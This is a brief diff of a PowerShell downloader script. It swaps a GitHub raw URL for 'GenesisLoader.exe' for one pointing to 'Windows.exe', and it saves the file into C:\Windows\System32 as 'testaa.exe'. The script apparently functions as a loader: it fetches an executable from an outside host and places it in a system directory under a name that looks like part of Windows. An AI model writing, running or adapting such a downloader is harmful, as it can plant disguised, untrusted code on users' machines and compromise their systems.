@@ -1,4 +1,4 @@
-$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/main/GenesisLoader.exe"
+$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/blob/main/Windows.exe"
 $exePath = "C:\Windows\System32\testaa.exe"
 
 Write-Host "Downloading..." -ForegroundColor Cyan
